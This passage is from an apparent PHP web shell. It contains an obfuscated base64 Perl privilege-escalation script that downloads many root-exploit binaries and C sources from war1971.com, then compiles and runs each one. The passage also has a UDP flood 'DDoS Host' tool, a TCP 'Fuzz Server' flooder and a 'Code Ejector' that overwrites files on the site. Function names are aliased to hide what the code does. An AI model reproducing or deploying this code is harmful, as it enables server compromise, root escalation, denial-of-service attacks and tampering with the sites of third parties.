bSgiLi9ydW4uc2giKTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3Ag eHBsIHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNf RklMRVMvZmlsZS9jYy8yOS5jIik7IA0Kc3lzdGVtKCJnY2MgMjkuYyAtbyAyOSIpOyAgDQpzeXN0 ZW0oImNobW9kIDc3NyAyOSIpOyANCnN5c3RlbSgiLi8yOSIpOyANCnN5c3RlbSgiaWQiKTsgDQpw cmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oImh0dHA6 Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy8zMCIpOyAgDQpzeXN0ZW0oImNobW9kIDc3 NyAzMCIpOyANCnN5c3RlbSgiLi8zMCIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSBy IHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL3dhcjE5 NzEuY29tL0NNU19GSUxFUy9maWxlL2NjLzIwMDkiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgMjAw OSIpOyANCnN5c3RlbSgiLi8yMDA5Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnByaW50ICJJZiB1IHIg cjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3 MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvaXNrb3JwaXR4Iik7ICANCnN5c3RlbSgiY2htb2QgNzc3 IGlza29ycGl0eCIpOyANCnN5c3RlbSgiLi9pc2tvcnBpdHgiKTsgDQpzeXN0ZW0oImlkIik7IA0K cHJpbnQgIklmIHUgciByMDB0IHN0b3AgeHBsIHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0 IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy9jIik7ICANCnN5c3RlbSgiY2ht b2QgNzc3IGMiKTsgDQpzeXN0ZW0oIi4vYyIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYg dSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL3dh cjE5NzEuY29tL0NNU19GSUxFUy9maWxlL2NjL2N4Iik7ICANCnN5c3RlbSgiY2htb2QgNzc3IGN4 Iik7IA0Kc3lzdGVtKCIuL2N4Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnByaW50ICJJZiB1IHIgcjAw dCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5j b20vQ01TX0ZJTEVTL2ZpbGUvY2MvZGVybGUyIik7ICANCnN5c3RlbSgiY2htb2QgNzc3IGRlcmxl MiIpOyANCnN5c3RlbSgiLi9kZXJsZTIiKTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUg ciByMDB0IHN0b3AgeHBsIHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIx OTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy9kZXJsZSIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyBk ZXJsZSIpOyANCnN5c3RlbSgiLi9kZXJsZSIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYg dSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL3dh cjE5NzEuY29tL0NNU19GSUxFUy9maWxlL2NjLzZ4LmMiKTsgIA0Kc3lzdGVtKCJnY2MgNnguYyAt byA2eGEiKTsgDQpzeXN0ZW0oIi4vNnhhIik7IA0Kc3lzdGVtKCJpZCIpOyANCnByaW50ICJJZiB1 IHIgcjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vd2Fy MTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvNngiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgNngi KTsgDQpzeXN0ZW0oIi4vNngiKTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0 IHN0b3AgeHBsIHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNv bS9DTVNfRklMRVMvZmlsZS9jYy82YiIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyA2YiIpOyANCnN5 c3RlbSgiLi82YiIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4 cGwgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL3dhcjE5NzEuY29tL0NNU19G SUxFUy9maWxlL2NjLzZ4eCIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyA2eHgiKTsgDQpzeXN0ZW0o Ii4vNnh4Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnByaW50ICJJZiB1IHIgcjAwdCBzdG9wIHhwbCB3 aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVT L2ZpbGUvY2MvMjc3MDQiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgMjc3MDQiKTsgDQpzeXN0ZW0o Ii4vMjc3MDQiKTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3AgeHBs IHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklM RVMvZmlsZS9jYy9kZXJsZTIuYyIpOyANCnN5c3RlbSgiZ2NjIGRlcmxlMi5jIC1vIGRlcmxlMiIp OyAgDQpzeXN0ZW0oImNobW9kIDc3NyBkZXJsZTIiKTsgDQpzeXN0ZW0oIi4vZGVybGUyIik7IA0K c3lzdGVtKCJpZCIpOyANCnByaW50ICJJZiB1IHIgcjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xu IjsNCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvZGVy bGUyIik7IA0Kc3lzdGVtKCJjaG1vZCA3NzcgZGVybGUyIik7IA0Kc3lzdGVtKCIuL2RlcmxlMiIp OyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJs K2NcbiI7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9j Yy8yOC5jIik7IA0Kc3lzdGVtKCJnY2MgMjguYyAtbyAyOCIpOyANCnN5c3RlbSgiY2htb2QgNzc3 IDI4Iik7IA0Kc3lzdGVtKCIuLzI4Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgiLi8yOCIp OyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJs K2NcbiI7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9j Yy8yNy5jIik7IA0Kc3lzdGVtKCJnY2MgMjcuYyAtbyAyNyIpOyANCnN5c3RlbSgiY2htb2QgNzc3 IDI3Iik7IA0Kc3lzdGVtKCIuLzI3Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgiLi8yNyIp OyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJs K2NcbiI7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9j Yy9jLmMiKTsgDQpzeXN0ZW0oImdjYyBjLmMgLW8gYyIpOyANCnN5c3RlbSgiY2htb2QgNzc3IGMi KTsgDQpzeXN0ZW0oIi4vYyIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIi4vYyIpOyANCnN5 c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7 IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy9jMi5j Iik7IA0Kc3lzdGVtKCJnY2MgYzIuYyAtbyBjMiIpOyANCnN5c3RlbSgiY2htb2QgNzc3IGMyIik7 IA0Kc3lzdGVtKCIuL2MyIik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgiLi9jMiIpOyANCnN5 c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7 IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy8wNSIp OyANCnN5c3RlbSgiY2htb2QgNzc3IDA1Iik7IA0Kc3lzdGVtKCIuLzA1Iik7IA0Kc3lzdGVtKCJp ZCIpOyANCnByaW50ICJJZiB1IHIgcjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xuIjsgDQpzeXN0 ZW0oIndnZXQgaHR0cDovL3dhcjE5NzEuY29tL0NNU19GSUxFUy9maWxlL2NjL2lza28iKTsgDQpz eXN0ZW0oImNobW9kIDc3NyBpc2tvIik7IA0Kc3lzdGVtKCIuL2lza28iKTsgDQpzeXN0ZW0oImlk Iik7DQpzeXN0ZW0oIi4vaXNrbyIpOyANCnN5c3RlbSgiaXNrbyIpOw0KcHJpbnQgIklmIHUgciBy MDB0IHN0b3AgeHBsIHdpdGggY3RybCtjXG4iOyANCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3 MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvMTgiKTsgDQpzeXN0ZW0oImNobW9kIDc3NyAxOCIpOyAN CnN5c3RlbSgiLi8xOCIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIi4vMTgiKTsgDQpzeXN0 ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3AgeHBsIHdpdGggY3RybCtjXG4iOyAN CnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvNyIpOyAN CnN5c3RlbSgiY2htb2QgNzc3IDciKTsgDQpzeXN0ZW0oIi4vNyIpOyANCnN5c3RlbSgiaWQiKTsg DQpzeXN0ZW0oIi4vNyIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3Rv cCB4cGwgd2l0aCBjdHJsK2NcbiI7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9D TVNfRklMRVMvZmlsZS9jYy83LTIiKTsgDQpzeXN0ZW0oImNobW9kIDc3NyA3LTIiKTsgDQpzeXN0 ZW0oIi4vNy0yIik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgiLi83LTIiKTsgDQpzeXN0ZW0o ImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3AgeHBsIHdpdGggY3RybCtjXG4iOyANCnN5 c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvOCIpOyANCnN5 c3RlbSgiY2htb2QgNzc3IDgiKTsgDQpzeXN0ZW0oIi4vOCIpOyANCnN5c3RlbSgiaWQiKTsgDQpz eXN0ZW0oIi4vOCIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4 cGwgd2l0aCBjdHJsK2NcbiI7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNf RklMRVMvZmlsZS9jYy84YSIpOyANCnN5c3RlbSgiY2htb2QgNzc3IDhhIik7IA0Kc3lzdGVtKCIu LzhhIik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgiLi84YSIpOyANCnN5c3RlbSgiaWQiKTsg DQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7IA0Kc3lzdGVtKCJ3 Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy84YmIiKTsgDQpzeXN0ZW0o ImNobW9kIDc3NyA4YmIiKTsgDQpzeXN0ZW0oIi4vOGJiIik7IA0Kc3lzdGVtKCJpZCIpOyANCnBy aW50ICJJZiB1IHIgcjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xuIjsgDQpzeXN0ZW0oIndnZXQg aHR0cDovL3dhcjE5NzEuY29tL0NNU19GSUxFUy9maWxlL2NjLzhjYyIpOyANCnN5c3RlbSgiY2ht b2QgNzc3IDhjYyIpOyANCnN5c3RlbSgiLi84Y2MiKTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQg IklmIHUgciByMDB0IHN0b3AgeHBsIHdpdGggY3RybCtjXG4iOyANCnN5c3RlbSgid2dldCBodHRw Oi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvOHgiKTsgDQpzeXN0ZW0oImNobW9kIDc3 NyA4eCIpOyANCnN5c3RlbSgiLi84eCIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIi4vOHgi KTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3AgeHBsIHdpdGggY3Ry bCtjXG4iOyANCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUv Y2MvOSIpOyANCnN5c3RlbSgiY2htb2QgNzc3IDkiKTsgDQpzeXN0ZW0oIi4vOSIpOyANCnN5c3Rl bSgiaWQiKTsgDQpzeXN0ZW0oIi4vOSIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSBy IHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIx OTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy9rcmFkMiIpOyANCnN5c3RlbSgiY2htb2QgNzc3IGty YWQyIik7IA0Kc3lzdGVtKCIuL2tyYWQyIik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgiLi9r cmFkMiAtdCAxIC1wIDIiKTsgDQpzeXN0ZW0oImlkIik7IA0Kc3lzdGVtKCIuL2tyYWQyIC10IDEg LXAgMyIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIi4va3JhZDIgLXQgMSAtcCA0Iik7IA0K c3lzdGVtKCJpZCIpOyANCnN5c3RlbSgiLi9rcmFkMiAtdCAxIC1wIDUiKTsgDQpzeXN0ZW0oImlk Iik7IA0Kc3lzdGVtKCIuL2tyYWQyIC10IDEgLXAgNiIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0 ZW0oIi4va3JhZDIgLXQgMSAtcCA3Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgiLi9rcmFk MiAtdCAxIC1wIDgiKTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3Ag eHBsIHdpdGggY3RybCtjXG4iOyANCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01T X0ZJTEVTL2ZpbGUvY2Mva3JhZCIpOyANCnN5c3RlbSgiY2htb2QgNzc3IGtyYWQiKTsgDQpzeXN0 ZW0oIi4va3JhZCIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIi4va3JhZCAtdCAxIC1wIDIi KTsgDQpzeXN0ZW0oImlkIik7IA0Kc3lzdGVtKCIuL2tyYWQgLXQgMSAtcCAzIik7IA0Kc3lzdGVt KCJpZCIpOyANCnN5c3RlbSgiLi9rcmFkIC10IDEgLXAgNCIpOyANCnN5c3RlbSgiaWQiKTsgDQpz eXN0ZW0oIi4va3JhZCAtdCAxIC1wIDUiKTsgDQpzeXN0ZW0oImlkIik7IA0Kc3lzdGVtKCIuL2ty YWQgLXQgMSAtcCA2Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgiLi9rcmFkIC10IDEgLXAg NyIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIi4va3JhZCAtdCAxIC1wIDgiKTsgDQpzeXN0 ZW0oImlkIik7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmls ZS9jYy9rLXJhZDMiKTsgDQpzeXN0ZW0oImNobW9kIDc3NyBrLXJhZDMiKTsgDQpzeXN0ZW0oIi4v ay1yYWQzIC10IDEgLXAgMiIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIi4vay1yYWQzIC10 IDEgLXAgMyIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIi4vay1yYWQzIC10IDEgLXAgNCIp OyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIi4vay1yYWQzIC10IDEgLXAgNSIpOyANCnN5c3Rl bSgiaWQiKTsgDQpzeXN0ZW0oIi4vay1yYWQzIC10IDEgLXAgNiIpOyANCnN5c3RlbSgiaWQiKTsg DQpzeXN0ZW0oIi4vay1yYWQzIC10LXAgMiIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIi4v ay1yYWQzIC10IC1wIDIiKTsgDQpzeXN0ZW0oImlkIik7IA0Kc3lzdGVtKCIuL2stcmFkMyAtYSAt cCA3Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgiLi9rLXJhZDMgLWEgLXAgNyIpOyANCnN5 c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7 IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy8yNjgi KTsgDQpzeXN0ZW0oImNobW9kIDc3NyAyNjgiKTsgDQpzeXN0ZW0oIi4vMjY4Iik7IA0KcHJpbnQg IklmIHUgciByMDB0IHN0b3AgeHBsIHdpdGggY3RybCtjXG4iOyANCnN5c3RlbSgid2dldCBodHRw Oi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvMjAwOCIpOyANCnN5c3RlbSgiY2htb2Qg Nzc3IDIwMDgiKTsgDQpzeXN0ZW0oIi4vMjAwOCIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAi SWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7ICANCnN5c3RlbSgid2dldCBodHRw Oi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvMjAwOXguYyIpOyANCnN5c3RlbSgiZ2Nj IDIwMDl4LmMgLW8gMjAwOXgiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgMjAwOXgiKTsgDQpzeXN0 ZW0oIi4vMjAwOXgiKTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3Ag eHBsIHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNf RklMRVMvZmlsZS9jYy8yMDA5eHgiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgMjAwOXh4Iik7IA0K c3lzdGVtKCIuLzIwMDl4eCIpOyANCnN5c3RlbSgiaWQiKTsNCnN5c3RlbSgiaWQiKTsgDQpwcmlu dCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7IA0Kc3lzdGVtKCJ3Z2V0IGh0 dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy8yLjYuOS01NS0yMDA3LXBydjgiKTsg DQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuOS01NS0yMDA3LXBydjgiKTsgDQpzeXN0ZW0oIi4vMi42 LjktNTUtMjAwNy1wcnY4Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgiLi8yLjYuOS01NS0y MDA3LXBydjgiKTsgDQpzeXN0ZW0oImlkIik7IA0Kc3lzdGVtKCIuLzIuNi45LTU1LTIwMDctcHJ2 OCIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBj dHJsK2NcbiI7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmls ZS9jYy8xOCIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyAxOCIpOyANCnN5c3RlbSgiLi8xOCIpOyAN CnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIndnZXQgaHR0cDovL3dhcjE5NzEuY29tL0NNU19GSUxF Uy9maWxlL2NjLzgiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgOCIpOyANCnN5c3RlbSgiLi84Iik7 IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJ TEVTL2ZpbGUvY2MvZHoiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgZHoiKTsgDQpzeXN0ZW0oIi4v ZHoiKTsgDQpzeXN0ZW0oImlkIik7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9D TVNfRklMRVMvZmlsZS9jYy94ODYiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgeDg2Iik7IA0Kc3lz dGVtKCIuL3g4NiIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIndnZXQgaHR0cDovL3dhcjE5 NzEuY29tL0NNU19GSUxFUy9maWxlL2NjL2xvbCIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyBsb2wi KTsgDQpzeXN0ZW0oIi4vbG9sIik7IA0Kc3lzdGVtKCJpZCIpOyANCn0=";
    $fd   = $pen("r00t.pl", "w");
    $b = strrev("edoced_4"."6esab");
    if ($fd != FALSE) {
        $feather($fd, $b($r00t));
        $out = all_xbox("perl r00t.pl;");
        if ($out != "") {
            $cmd_out = all_xbox("whoami");
            if ($cmd_out != "") {
                if (strpos($cmd_out, 'root') !== false) {
                    echo "<br/>You are " . trim(all_xbox("whoami")) . ".<br/>";
                } else {
                    echo "<br/>You are " . trim(all_xbox("whoami")) . ".<br/>";
                }
            } else {
                echo "<br/>Rooting Failed<br/>";
            }
        }
        unlink("r00t.pl");
    } else {
        echo "An error has occurred.";
    }
    
    
} elseif ($action == 'dos') {
	formhead(array(
        'title' => 'DDoS Host'
    ));
    if (isset($ip) && isset($exTime) && isset($port) && isset($timeout) && isset($exTime) && $exTime != "" && $port != "" && $ip != "" && $timeout != "" && $exTime != "") {
        $data          = "";
        $packets       = 0;
        $maxTime       = time() + $exTime;
        $noOfBytesd = $noOfBytes - 3;
        while ($noOfBytesd--) {
            $data .= "X";
        }
        $data .= "4o4";
        print "I am at work now. Don't close this window untill you receive a message.<br/><br/>";
        while (1) {
            $socket = fsockopen("udp://$ip", $port, $error, $errorString, $timeout);
            if ($socket) {
                $feather($socket, $data);
                $pixel($socket);
                $packets++;
            }
            if (time() >= $maxTime) {
                break;
            }
        }
        echo "<script>alert('DDoS Completed!');</script>";
        echo "DOS attack against udp://$ip:$port completed on " . date("h:i:s A") . "<br/>";
        echo "Total Number of Packets Sent: " . $packets . "<br/>";
        echo "Total Data Sent: " . sizecount($packets * $noOfBytes) . "<br/>";
        echo "Data per packet: " . sizecount($noOfBytes) . "<br/>";
    } else {
echo '<form method="POST" onSubmit="window.onbeforeunload = null;">
           <input type="hidden" name="dos" />
                       IP
                       <input onmouseover="this.focus();" class="cmd" name="ip" value="127.0.0.1" onfocus="if(this.value == \'127.0.0.1\')this.value = ;" onblur="if(this.value==)this.value=\'127.0.0.1\';"/>
                       <br/>Port
                       <input onmouseover="this.focus();" class="cmd" name="port" value="80" onfocus="if(this.value == \'80\')this.value = ;" onblur="if(this.value==)this.value=\'80\';"/>
                       <br/>Timeout (Time in seconds)
                       <input onmouseover="this.focus();" type="text" class="cmd" name="timeout" value="5" onfocus="if(this.value == \'5\')this.value = ;" onblur="if(this.value==)this.value=\'5\';" />
                       <br/>'."\x45x\x65".'cution Time (Time in seconds) 
                       <input onmouseover="this.focus();" type="text" class="cmd" name="exTime" value="10" onfocus="if(this.value == \'10\')this.value = ;" onblur="if(this.value==)this.value=\'10\';"/>
                       <br/>Number of Bytes per/packet
                       <input onmouseover="this.focus();" type="text" class="cmd" name="noOfBytes" value="1048576" onfocus="if(this.value == \'1048576\')this.value = ;" onblur="if(this.value==)this.value=\'1048576\';"/>
                       <br/><input type="submit" class="bt" value="DDoS"/>';
        makehide('action', 'dos');
        echo "</form>";
    }
    
} elseif ($action == 'fuzz') {
formhead(array(
        'title' => 'Fuzz Server'
    ));
    if (isset($ip) && isset($port) && isset($times) && isset($time) && isset($message) && isset($messageMultiplier) && $message != "" && $time != "" && $times != "" && $port != "" && $ip != "" && $messageMultiplier != "") {
        $send       = 0;
        $ending     = "";
        $data       = "";
        $mode       = "tcp";
        $data .= "GET /";
        $ending .= " HTTP/1.1\n\r\n\r\n\r\n\r";
        if ($type == "tcp") {
            $mode = "tcp";
        }
        while ($messageMultiplier--) {
            $data .= urlencode($message);
        }
        $data .= "%s%s%s%s%d%x%c%n%n%n%n"; // add some format string specifiers
        $data .= "4o4" . $ending;
        $length = strlen($data);
        
        
        echo "Sending Data :-<br/>"; //.$data."</br>";
        print "I am working now! Don't close this window untill you receive a message.<br/><br/>";
        for ($i = 0; $i < $times; $i++) {
            $socket = fsockopen("$mode://$ip", $port, $error, $errorString, $time);
            if ($socket) {
                $feather($socket, $data, $length);
                $pixel($socket);
            }
        }
        echo "<script>alert('Fuzzing Completed!');</script>";
        echo "DOS attack against $mode://$ip:$port completed on " . date("h:i:s A") . "<br/>";
        echo "Total Number of Packets Sent: " . $times . "</br>";
        echo "Total Data Sent: " . sizecount($times * $length) . "<br/>";
        echo "Data per packet: " . sizecount($length) . "<br/>";
    } else {
?>
       <form method="POST" onSubmit="window.onbeforeunload = null;">
           <input type="hidden" name="fuzz" />
                       IP:
                       <input onmouseover="this.focus();" class="cmd" name="ip" value="127.0.0.1" onfocus="if(this.value == '127.0.0.1')this.value = ;" onblur="if(this.value==)this.value='127.0.0.1';"/>
                       <br/>Port:
                       <input onmouseover="this.focus();" class="cmd" name="port" value="80" onfocus="if(this.value == '80')this.value = ;" onblur="if(this.value==)this.value='80';"/>
                       <br/>Timeout:
                       <input onmouseover="this.focus();" type="text" class="cmd" name="time" value="5" onfocus="if(this.value == '5')this.value = ;" onblur="if(this.value==)this.value='5';"/>
                       <br/>Number of Times:
                       <input onmouseover="this.focus();" type="text" class="cmd" name="times" value="100" onfocus="if(this.value == '100')this.value = ;" onblur="if(this.value==)this.value='100';" />
                       <br/>Message (The message Should be long and it will be multiplied with the value after it):
                       <input onmouseover="this.focus();" class="cmd" name="message" value="%S%x--Some Garbage Here--%x%S" onfocus="if(this.value == '%S%x--Some Garbage here --%x%S')this.value = ;" onblur="if(this.value==)this.value='%S%x--Some Garbage here --%x%S';"/>
                       x
                       <input onmouseover="this.focus();" style="width: 30px;" class="cmd" name="messageMultiplier" value="10" />
                       <br/><input type="submit" class="bt" value="Fuzz"/>
       <?php
        makehide('action', 'fuzz');
        echo '</form>';
    }
} elseif ($action == 'cej') {
	formhead(array(
        'title' => 'Code Ejector'
    ));
    $self      = $_SERVER["PHP_SELF"]; // Where am i
    $SEPARATOR = '/';
    if (isset($dir) && $dir != "" && isset($filetype) && $filetype != "" && isset($message) && $message != "") {
        if ($handle = opendir($dir)) {
            echo "Overwritten Files :-<br/>";
            while (($file = readdir($handle)) !== False) {
                if (($prgm("/$filetype" . '$' . '/', $file, $matches) != 0) && ($prgm('/' . $file . '$/', $self, $matches) != 1)) {
                    $fd = $pen($dir . $file, "r");
                    if ($fd == false) {
                    } else {
                        $content = $books($fd, filesize($dir . $file));
                        $pixel($fd);
                        
                        
                        if ($mc) {
                            if (strstr($content, $message)) {
                                $fd = $pen($dir . $file, "w");
                                echo "<a href='" . str_replace($_SERVER["DOCUMENT_ROOT"], '', $dir) . $file . "'>" . $file . "</a><br/>";
                                $feather($fd, recursive_str_replace($message, "", $content));
                                $pixel($fd);
                            }
                        } else {
                            if (stristr($content, $message)) {
                                $fd = $pen($dir . $file, "w");
                                echo "<a href='" . str_replace($_SERVER["DOCUMENT_ROOT"], '', $dir) . $file . "'>" . $file . "</a><br/>";
                                $feather($fd, recursive_str_ireplace($message, "", $content));
                                $pixel($fd);
                            }
                        }
                        
                        
                        
                    }
                }
            }
        }
    } else {
        echo '
